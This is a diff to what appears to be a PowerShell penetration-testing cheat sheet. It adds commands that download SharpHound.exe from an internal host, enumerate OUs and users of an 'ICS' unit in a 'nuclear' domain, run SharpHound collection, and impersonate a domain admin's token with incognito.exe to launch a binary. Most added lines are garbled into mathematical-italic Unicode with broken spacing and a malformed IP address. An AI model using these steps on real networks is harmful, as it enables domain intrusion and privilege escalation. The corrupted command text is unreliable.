@@ -862,6 +862,12 @@ Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command
 &{Start-Process file.exe -verb runas)'
 ```
 
+### Upload with powershell
+
+```
+𝑝𝑜𝑤𝑒𝑟𝑠ℎ𝑒𝑙𝑙 𝑖𝑤𝑟 − 𝑢𝑠𝑒𝑏𝑎𝑠𝑖𝑐𝑝𝑎𝑟𝑠𝑖𝑛𝑔 ℎ𝑡𝑡𝑝://192.168.2. 𝑥/𝑆ℎ𝑎𝑟𝑝𝐻𝑜𝑢𝑛𝑑. 𝑒𝑥𝑒 − 𝑂𝑢𝑡𝐹𝑖𝑙𝑒 − 𝑆ℎ𝑎𝑟𝑝𝐻𝑜𝑢𝑛𝑑. 𝑒𝑥e
+```
+
 ### Email sender
 
 ```text
@@ -1569,4 +1575,29 @@ https://github.com/sperner/PowerShell/blob/master/PortScan.ps1
 
 ```text
 PS> Test-WSMan -ComputerName <COMPUTERNAME> -Port 6666
+```
+
+## Enumerate OU’s 
+
+```
+𝐺𝑒𝑡 − 𝑁𝑒𝑡𝑂𝑈 − 𝑣𝑒𝑟𝑏𝑜𝑠𝑒
+```
+
+## Retrieve users in ‘ICS’ OU
+
+```
+𝐺𝑒𝑡 − 𝐷𝑜𝑚𝑎𝑖𝑛𝑈𝑠𝑒𝑟 − 𝑆𝑒𝑎𝑟𝑐ℎ𝐵𝑎𝑠𝑒 "𝐿𝐷𝐴𝑃://𝑂𝑈 = 𝐼𝐶𝑆,𝐷𝐶 = 𝑛𝑢𝑐𝑙𝑒𝑎𝑟,𝐷𝐶 = 𝑠𝑖𝑡𝑒" − 𝑉𝑒𝑟𝑏𝑜𝑠𝑒
+```
+
+## SharpHound Collect
+
+```
+SharpHound.exe --CollectionMethod all
+```
+
+## Impersonate Token of nuclear\vdadmin (on psexec session)
+
+```
+𝑖𝑛𝑐𝑜𝑔𝑛𝑖𝑡𝑜. 𝑒𝑥𝑒 𝑙𝑖𝑠𝑡_𝑡𝑜𝑘𝑒𝑛𝑠 −u 
+𝑖𝑛𝑐𝑜𝑔𝑛𝑖𝑡𝑜. 𝑒𝑥𝑒 𝑒𝑥𝑒𝑐𝑢𝑡𝑒 − 𝑐 "𝑁𝑈𝐶𝐿𝐸𝐴𝑅\𝑣𝑑𝑎𝑑𝑚𝑖𝑛" 𝐶:\𝑈𝑠𝑒𝑟𝑠\𝑃𝑢𝑏𝑙𝑖𝑐\𝑏𝑖𝑛𝑎𝑟𝑦.𝑒𝑥e
 ```
